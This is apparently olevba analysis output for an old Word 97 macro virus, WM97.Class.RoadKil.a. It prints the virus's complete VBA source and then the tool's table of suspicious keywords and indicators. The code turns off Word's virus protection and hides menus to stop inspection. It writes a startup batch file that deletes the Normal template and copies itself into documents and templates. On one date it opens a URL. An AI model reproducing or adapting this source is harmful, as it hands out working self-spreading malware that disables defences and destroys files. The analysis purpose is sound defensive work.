olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-e63b32e60d2e9044d8caeb7657b3fdd4cc55e2f4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Source-e63b32e60d2e9044d8caeb7657b3fdd4cc55e2f4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'WM97.Class.RoadKil.a
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Greets to jackie, AngelsKitten, Tally, Lys, Error, foxz, and Vic
'This baby goes out to Roadkil.
On Error Resume Next
CheckHostNormal = GetAttr(NormalTemplate.FullName)
If CheckHostNormal = vbReadOnly Or CheckHostNormal = vbReadOnly + vbArchive Then
Norm$ = NormalTemplate
AttribMe$ = "attrib -h -r "
GetTemplates1$ = "c:\progra~1\micros~1\templa~1\"
GetTemplates2$ = "c:\progra~1\micros~2\templa~1\"
Open "c:\WINDOWS\Start Menu\Programs\StartUp\msoffice.bat" For Output As #1
Print #1, AttribMe$ + GetTemplates1$ + Norm$
Print #1, AttribMe$ + GetTemplates2$ + Norm$
Print #1, "del " + GetTemplates1$ + Norm$
Print #1, "del " + GetTemplates2$ + Norm$
Print #1, "del c:\windows\startm~1\programs\startup\msoffice.bat"
Close #1
End If
Application.ShowVisualBasicEditor = False
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.EnableCancelKey = wdCancelDisabled
With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
End With
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Customize...").Delete
CommandBars("view").Controls("Toolbars").Delete
CommandBars("view").Controls("Status Bar").Delete
RoadKilHost = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
RoadKil = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
 Set RoadKilCode = ActiveDocument.VBProject.VBComponents.Item(1)
 RoadKilDoc = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
 Set RoadKilCode = NormalTemplate.VBProject.VBComponents.Item(1)
 RoadKilInfect = True
End If
If RoadKilInfect <> True And RoadKilDoc <> True Then GoTo RoadKilSave
If RoadKilInfect = True Then RoadKilCode.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RoadKil - 1))
If RoadKilDoc = True Then RoadKilCode.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RoadKilHost - 1))
If Day(Now) = 26 Then
Assistant.Visible = True
With Assistant.NewBalloon
 .Icon = msoIconAlert
 .Text = "by -KD- [Metaphase VX Team & NoMercyVirusTeam]" & Chr$(13) & "" & "And Dr Dre say..Nothing you idiots.. Dr Dre's dead.. hes locked in my basement!"
 .Heading = "WM97.Class.RoadKil.a"
 .Animation = msoAnimationGetTechy
 .Show
End With
Shell "start http://www.coderz.net/roadkil/", vbHide
End If
RoadKilSave:
On Error Resume Next
If RoadKilHost <> 0 And RoadKil = 0 Then
 ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.coderz.ne|URL                                          |
|          |t/roadkil/          |                                             |
|IOC       |WM97.Class          |Executable file name                         |
|IOC       |msoffice.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

